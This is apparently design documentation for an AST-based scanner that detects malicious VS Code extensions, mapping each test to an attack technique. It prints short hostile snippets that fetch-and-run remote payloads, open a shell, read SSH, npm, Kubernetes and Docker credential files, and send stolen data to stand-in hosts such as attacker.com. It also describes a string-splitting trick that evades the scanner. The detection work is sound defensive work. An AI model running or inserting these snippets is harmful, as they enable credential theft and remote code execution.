# Attack patterns covered by the AST scanner

This document maps each test in `scanner_test.go` to the real-world attack
technique it defends against. For each case it notes whether the previous
regex-based scanner would have caught it, and why the AST approach does better.

---

## 1. Shell command execution via `child_process`

**Attack:** A malicious extension imports Node's `child_process` module and
uses `exec`, `execSync`, or `spawn` to run arbitrary shell commands on the
victim's machine. This is the most direct form of code execution available
to a VS Code extension.

**Real-world example:** The 2022 `node-ipc` supply-chain attack used
`child_process.exec` to run destructive commands on machines with Russian or
Belarusian locale settings.

### Direct import (baseline)

```js
const cp = require('child_process');
cp.exec('curl https://attacker.com/payload | sh');
```

**Tests:** `TestExecDirectImport`, `TestExecSyncDirectImport`, `TestSpawnDirectImport`
**Regex:** catches it — `child_process` literal is present, gate opens.
**AST:** catches it — binding tracker maps `cp → 'child_process'`, flags `.exec()`.

---

### Bundler-generated aliases

When a bundler (webpack, esbuild) merges many source files into one, it
renames variables to avoid collisions. The same module ends up imported under
`cp10`, `cp11`, etc. in the output bundle.

```js
var cp10 = require('child_process');
var cp11 = require('child_process');
cp10.exec(cmd);
cp11.spawn('/bin/sh', ['-i']);
```

**Tests:** `TestExecBundlerAlias`
**Regex:** catches it — string `child_process` still present, gate opens for
both calls. But the gate is file-wide: any `child_process` import anywhere
in a 2.5 MB bundle would open the gate for every `exec()` call in that file,
including innocent ones.
**AST:** catches it correctly per-variable — `cp10` and `cp11` are each
individually tracked to `child_process`, so only calls on those specific
bindings are flagged.

---

### Destructured import

An extension can import individual functions from `child_process` directly
into local scope, bypassing the `obj.method()` call shape the regex expects.

```js
const { exec, spawn } = require('child_process');
exec('id');
spawn('/bin/sh', ['-c', 'whoami']);
```

**Tests:** `TestExecDestructured`
**Regex:** technically catches it — the string literal is present and `exec(`
matches — but for the wrong reason. It would flag `exec(` in any file that
mentions `child_process` anywhere, even if the two are unrelated.
**AST:** catches it structurally — records that the local name `exec` was
destructured from `child_process`, then flags the bare `exec()` call with the
correct module attribution.

---

## 2. Dynamic code evaluation

**Attack:** Instead of writing the malicious payload as readable code, the
attacker encodes it as a string and executes it at runtime. This bypasses
static inspection because the dangerous code only exists in memory, never as
readable source.

### `eval()`

```js
eval(atob('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lkJyk='));
// decodes to: require('child_process').exec('id')
```

**Tests:** `TestEvalGlobal`
**Regex:** catches the `eval(` call. AST also catches it, and correctly
attributes it as `HIGH` severity.

---

### `new Function()`

Functionally identical to `eval` but less commonly known. Constructs a new
function object from a string and calls it.

```js
const fn = new Function('return require("child_process").exec("id")');
fn();
```

**Tests:** `TestNewFunction`
**Regex:** catches `new\s+Function\s*\(`. AST also catches it via `NewExpr`
node inspection.

---

### `vm.runInNewContext()` and `vm.runInThisContext()`

Node's `vm` module provides a dedicated sandboxed execution environment. Both
`runInNewContext` and `runInThisContext` execute arbitrary code strings — they
are `eval` equivalents with a different API surface.

```js
const vm = require('vm');
vm.runInNewContext(codeFromNetwork, { require });
```

**Tests:** `TestVMRunInNewContext`, `TestVMRunInThisContext`
**Regex:** **misses entirely** — `vm` module is not in the regex catalogue.
**AST:** catches it — binding tracker maps the local name to `'vm'` module,
then flags `.runInNewContext()` and `.runInThisContext()` calls on that binding.

---

### `setTimeout` / `setInterval` with a string argument

Less known: both `setTimeout` and `setInterval` accept a **string** as their
first argument and execute it as code, identical to `eval`. When the first
argument is a function (the normal usage) they are completely safe.

```js
// dangerous — string is eval'd
setTimeout("fetch('https://attacker.com/exfil?d=' + document.cookie)", 0);

// safe — function is called normally
setTimeout(() => syncSettings(), 5000);
```

**Tests:** `TestSetTimeoutStringEval`, `TestSetIntervalStringEval`,
`TestSetTimeoutFunctionNotFlagged`
**Regex:** **misses** — `setTimeout` is not in the catalogue. Even if it were
added, a regex cannot distinguish a string first argument from a function
first argument without parsing the code.
**AST:** catches it — inspects the type of the first argument node. If it is
a `StringLiteral`, flag it. If it is a `FunctionExpression` or
`ArrowFunction`, stay silent.

---

## 3. Credential and environment theft

**Attack:** Extensions have full filesystem access. A malicious one reads
credential files and environment variables, then exfiltrates them.

### `process.env` — dot notation (baseline)

```js
const key = process.env.AWS_SECRET_ACCESS_KEY;
```

**Tests:** `TestProcessEnvDot`
**Regex:** catches it with `process\.env`.
**AST:** catches it via `MemberExpression` node with object `process` and
property `env`.

---

### `process.env` — bracket notation

A trivial evasion: replace the dot with bracket notation. The meaning is
identical but the text looks completely different.

```js
const key = process['env']['AWS_SECRET_ACCESS_KEY'];
```

**Tests:** `TestProcessEnvBracket`
**Regex:** **misses** — the pattern `process\.env` requires a literal dot
character. No regex rewrite can match both `process.env` and `process['env']`
without unacceptable false positives.
**AST:** catches it — both dot and bracket access produce the same node type
(`MemberExpression` / `IndexExpr`) with the same object and property values.
The scanner checks the values, not the punctuation.

---

### SSH private keys

```js
const privateKey = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'));
```

**Tests:** `TestSSHCredentialPath`
**Regex and AST:** both catch `.ssh` as a string literal. The AST approach
scans `StringLiteral` nodes specifically, which is more precise than a
full-file text search.

---

### npm auth tokens (`.npmrc`)

`.npmrc` stores authentication tokens for npm registries in plain text. A
stolen token grants the attacker the ability to publish packages as the victim.

```js
const rc = fs.readFileSync(path.join(home, '.npmrc'), 'utf8');
```

**Tests:** `TestNPMRCCredentialPath`
**Regex:** **misses** — `.npmrc` is not in the current pattern catalogue.
**AST:** catches it — `.npmrc` is added to the string-literal credential path
table, which the scanner checks against every `StringLiteral` node.

---

### Kubernetes credentials (`.kube/config`)

`.kube/config` contains cluster certificates and service account tokens.
Access to it gives the attacker full control over any Kubernetes cluster the
developer has credentials for.

```js
const kubeConfig = fs.readFileSync(home + '/.kube/config', 'utf8');
```

**Tests:** `TestKubeconfigPath`
**Regex:** **misses** — not in catalogue.
**AST:** catches it.

---

### Docker registry tokens (`.docker/config.json`)

`.docker/config.json` stores authentication tokens for Docker Hub and private
registries. A stolen token can be used to pull private images or push
malicious ones.

```js
const dockerCfg = JSON.parse(fs.readFileSync(home + '/.docker/config.json'));
```

**Tests:** `TestDockerConfigPath`
**Regex:** **misses** — not in catalogue.
**AST:** catches it.

---

## 4. Network exfiltration

**Attack:** After collecting credentials or source code, the extension sends
the data to an attacker-controlled server. There are many Node APIs that
accomplish this; the regex catalogue only covers two of them.

### `fetch()` (baseline)

```js
fetch('https://attacker.com/collect?token=' + stolen);
```

**Tests:** `TestFetchGlobal`
**Regex and AST:** both catch it.

---

### Node `https` / `http` modules

The built-in `https` and `http` modules make outbound requests without using
`fetch`. An attacker who knows extwatch watches for `fetch(` simply uses the
lower-level API instead.

```js
const https = require('https');
https.request({ host: 'attacker.com', path: '/steal' }, cb).end();
```

**Tests:** `TestHTTPSModule`, `TestHTTPModule`
**Regex:** **misses** — `require('https')` and `https.request` are not in the
catalogue.
**AST:** catches it — binding tracker maps local name to `'https'` or `'http'`
module, then flags `.request()` calls on that binding.

---

### Raw TCP via `net` module

`net.createConnection` opens a raw TCP socket to any host and port. Data can
be sent with no HTTP overhead and no pattern that looks like a URL.

```js
const net = require('net');
const sock = net.createConnection({ port: 4444, host: 'attacker.com' });
sock.write(JSON.stringify(stolenData));
```

**Tests:** `TestNetModule`
**Regex:** **misses** — `net` module not in catalogue.
**AST:** catches it via binding tracker and `.createConnection()` detection.

---

### WebSocket

```js
const ws = new WebSocket('wss://attacker.com/c2');
ws.send(JSON.stringify(stolenCredentials));
```

**Tests:** `TestWebSocketNew`
**Regex and AST:** both catch it via `WebSocket` constructor detection.

---

### `XMLHttpRequest`

Available in VS Code extension webviews. Functions identically to `fetch` but
uses an older API that the regex catalogue does not cover.

```js
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://attacker.com/collect');
xhr.send(stolenData);
```

**Tests:** `TestXMLHttpRequest`
**Regex:** **misses** — not in catalogue.
**AST:** catches it via `NewExpr` node where the callee is `XMLHttpRequest`.

---

### VS Code terminal API

VS Code extensions can create a hidden terminal and send arbitrary shell
commands to it. From the OS perspective this is indistinguishable from the
user typing those commands themselves.

```js
const vscode = require('vscode');
const term = vscode.window.createTerminal({ name: 'updater', hideFromUser: true });
term.sendText('curl https://attacker.com/payload | sh');
```

**Tests:** `TestVSCodeTerminal`
**Regex:** **misses entirely** — no VS Code API methods are in the catalogue.
**AST:** catches it — binding tracker resolves local name to `'vscode'` module,
then flags `.window.createTerminal()` calls on that binding at HIGH severity.

---

## 5. Known blind spots (documented, not fixed)

### String-split `require()`

Splitting the module name across string concatenation defeats the binding
tracker because the full module name never appears as a single string literal
in the source.

```js
const cp = require('child' + '_process');
cp.exec('id');
```

**Tests:** `TestStringSplitRequireEvades` — this test **asserts we do not
catch it**. Resolving this requires taint analysis (tracking values through
expressions at runtime), which is out of scope for static AST scanning. The
test exists so that any future implementation that genuinely solves this case
will trigger a deliberate test update rather than silently changing behaviour.

This is the same limitation as obfuscated or base64-encoded payloads: static
analysis can only read what is written; it cannot execute the code to discover
what it produces.

---

## Summary

| Attack | Regex | AST |
|---|---|---|
| `child_process.exec/spawn` direct | ✓ | ✓ |
| Bundler-generated aliases (`cp10`) | ✓ (file-wide gate) | ✓ (per-variable) |
| Destructured import `{ exec }` | ✓ (text match) | ✓ (structural) |
| `vm.runInNewContext()` | ✗ | ✓ |
| `setTimeout(string)` eval | ✗ | ✓ |
| `process['env']` bracket notation | ✗ | ✓ |
| `.npmrc` credential path | ✗ | ✓ |
| `.kube/config` credential path | ✗ | ✓ |
| `.docker/config.json` path | ✗ | ✓ |
| `require('https').request()` | ✗ | ✓ |
| `require('http').request()` | ✗ | ✓ |
| `require('net').createConnection()` | ✗ | ✓ |
| `XMLHttpRequest` | ✗ | ✓ |
| `vscode.window.createTerminal()` | ✗ | ✓ |
| String-split `require('a'+'b')` | ✗ | ✗ (known limit) |
